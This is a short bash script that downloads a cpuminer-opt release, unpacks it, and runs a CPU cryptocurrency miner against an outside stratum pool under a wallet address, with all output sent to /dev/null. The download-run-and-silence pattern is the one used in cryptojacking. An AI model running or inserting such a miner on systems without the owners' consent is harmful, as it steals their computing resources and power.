#!/bin/bash
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
tar xfv cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TUB1N4ZUEmeGroemVHuZoz9beJYdnHJ6Dt.test >>/dev/null
